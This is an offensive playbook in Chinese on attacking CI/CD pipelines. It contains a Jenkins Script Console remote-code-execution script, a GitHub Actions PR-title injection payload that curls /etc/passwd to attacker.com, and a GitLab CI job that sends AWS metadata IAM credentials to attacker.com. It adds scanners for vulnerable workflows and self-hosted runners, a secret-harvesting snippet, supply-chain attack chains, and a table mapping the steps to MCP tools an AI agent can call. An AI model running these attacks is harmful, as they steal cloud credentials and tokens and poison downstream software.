# CI/CD Pipeline 攻击

## Jenkins Groovy Script Console

```python
# Jenkins Script Console = 直接执行 Groovy → shell
import requests

def jenkins_script_console(target: str, cmd: str):
    """Jenkins Script Console RCE"""
    groovy_code = f'''
    def proc = "{cmd}".execute()
    def out = new StringBuilder()
    proc.waitForProcessOutput(out, System.err)
    println(out.toString())
    '''
    r = requests.post(f"{target}/script", data={"script": groovy_code},
        auth=("user", "pass"))  # 如果无认证则跳过
    return r.text

# 如果 Script Console 无认证或凭证泄露 → 直接 RCE
# 典型 CTF 场景: Jenkins 暴露在公网，无密码
```

## GitHub Actions Workflow Injection

```yaml
# 场景: CI 从 PR body/title 取参数但不净化
# .github/workflows/build.yml:
#   - run: echo "${{ github.event.pull_request.title }}"

# Attack PR Title:
# ]); curl https://attacker.com/$(cat /etc/passwd | base64); #
# → 注入到 shell 命令 → RCE → 读 runner 的 secrets

# 更多注入点:
# PR body, branch name, commit message, issue title, label name
```

```python
# 自动化探测 GitHub Action 注入点
def probe_gha_injection(repo: str):
    """检测 workflow 是否从 PR 参数取数据"""
    import requests, re
    workflows = requests.get(
        f"https://api.github.com/repos/{repo}/contents/.github/workflows",
        headers={"Accept": "application/vnd.github.v3+json"}
    ).json()

    for wf in workflows:
        content = requests.get(wf["download_url"]).text
        # 找危险表达式
        dangerous = re.findall(
            r'\$\{\{\s*github\.event\.(pull_request|issue_comment|push)',
            content
        )
        if dangerous:
            print(f"[!] {wf['name']}: unsafe context refs: {dangerous}")
```

## GitLab CI YAML 注入

```python
# 如果 GitLab CI 允许用户通过 Web 界面或 API 编辑 .gitlab-ci.yml
# 在 runner 上直接执行命令:

# 攻击者提交的 .gitlab-ci.yml:
# stages:
#   - exploit
# exploit:
#   script:
#     - curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | base64 | curl -d @- https://attacker.com/log
#   tags:
#     - docker  # 或 self-hosted runner

# Self-hosted runner 上的 RCE = 访问到 runner 的所有环境变量和 secrets
```

## Self-Hosted Runner 滥用

```python
# 如果 PR 可以触发 self-hosted runner (默认不安全配置):
# 1. Fork repo → 修改 workflow → 在 self-hosted runner 上执行
# 2. 读 CI/CD secrets (GITHUB_TOKEN, AWS keys, etc.)
# 3. 如果 runner 部署在 AWS → 读 metadata → IAM credential

# 探测是否使用 self-hosted runner:
def detect_self_hosted(repo: str):
    """检查项目是否有 self-hosted runner"""
    wf = requests.get(
        f"https://api.github.com/repos/{repo}/actions/workflows"
    ).json()
    for w in wf.get("workflows", []):
        # 找 runs-on: [self-hosted, ...]
        r = requests.get(w["url"]).json()
        if "self-hosted" in str(r):
            print(f"[!] Self-hosted runner: {w['name']}")
```

## 环境变量/Secrets 渗出

```python
# 在 CI runner 上执行后:
import os
all_env = dict(os.environ)
# 找敏感变量
SENSITIVE_KEYS = ["AWS_", "GCP_", "AZURE_", "SECRET", "TOKEN", "KEY",
                   "NPM_TOKEN", "PYPI_TOKEN", "DOCKER_PASSWORD",
                   "KUBECONFIG", "SSH_KEY", "GITHUB_TOKEN"]
for k, v in all_env.items():
    if any(s in k.upper() for s in SENSITIVE_KEYS):
        print(f"[!] {k}={v[:30]}...")
```

## 攻击链

```
Jenkins Script Console RCE → 读 secrets → AWS IAM → 云账户
GitHub Action injection → shell RCE → GITHUB_TOKEN → push 后门到 main
GitLab CI YAML → runner RCE → metadata → IAM credential → 横向移动
Self-hosted runner → PR fork → workflow 修改 → secrets 渗出 → npm publish
CI pipeline → Docker image 污染 → 供应链攻击 → 下游全部受影响
```

## Evidence

记录: CI 配置内容、注入 payload、执行结果、提取的 secrets (脱敏)、runner 环境变量列表

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| CI/CD 端点探测 | `http_probe` | HTTP GET 探测 CI/CD 服务端点 |
| 知识检索 | `kb_router` | 按 CI/CD 攻击信号搜索知识库 |
